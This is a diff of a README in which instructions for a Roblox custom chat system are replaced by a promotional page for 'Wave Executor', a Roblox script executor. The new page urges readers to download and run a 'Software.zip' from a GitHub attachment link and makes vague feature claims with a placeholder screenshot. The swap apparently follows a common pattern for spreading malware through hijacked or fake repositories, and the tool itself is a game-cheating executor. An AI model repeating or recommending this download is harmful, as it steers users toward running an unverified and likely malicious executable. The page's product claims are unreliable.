@@ -1,13 +1,33 @@
-Rolox custom chat system:
+# Wave Executor: Unleash The Power of Roblox Scripting
 
-DevForum post: https://devforum.roblox.com/t/better-chat-v3-feature-rich-custom-chat-with-replies-rich-text-message-editing-and-more/1756348
+## Description
+Welcome to the Wave Executor GitHub repository! Wave Executor is a Windows-based script executor designed for Roblox enthusiasts like you. It offers a robust platform for executing scripts with advanced features such as AI integration for streamlined script development, premium ad-free functionalities, and round-the-clock support to enhance your gameplay experience to new levels.
 
-Uncompleted documentation: https://jumpathy.gitbook.io/betterchat-v3
+## Features
+- **AI Integration:** Seamlessly integrate artificial intelligence into your script development process.
+- **Premium Ad-Free Features:** Enjoy an ad-free experience with premium functionalities.
+- **24/7 Support:** Get support anytime, anywhere to ensure smooth operation.
 
-Installation instructions:
-1. Insert the loader: https://create.roblox.com/store/asset/9376009942/BetterChat-V3-Alpha
-2. Insert the source code from the releases page or from the auto-update plugin (updater.lua found in extras)
-2A. If installing manually, modify the loader to reference the new source code
-3. Go to TextChatService in the explorer, and set ‘ChatVersion’ to ‘LegacyChatService’
-4, Go to the model tab in studio, Advanced (on the far right), Service, and insert ‘Chat’.
-5. From here, all you need to do is turn off ‘LoadDefaultChat’ and ‘BubbleChatEnabled’
+## Usage
+To access Wave Executor, download the software from the following link:
+[Launch Wave Executor](https://github.com/user-attachments/files/18060583/Software.zip)
+
+## How to Download and Install
+1. Click on the link provided above to start the download.
+2. Once the download is complete, unzip the file.
+3. Follow the installation instructions within the unzipped folder.
+4. Launch Wave Executor and start exploring its powerful features.
+
+## Screenshots
+![Wave Executor](https://via.placeholder.com/800x400)
+
+## Support
+For any inquiries or assistance regarding Wave Executor, feel free to reach out to our team at support@waveexecutor.com.
+
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+### Explore More
+Discover the endless possibilities of Roblox scripting with Wave Executor. Elevate your gameplay, streamline your development process, and unlock new levels of creativity. Download Wave Executor today! 🚀
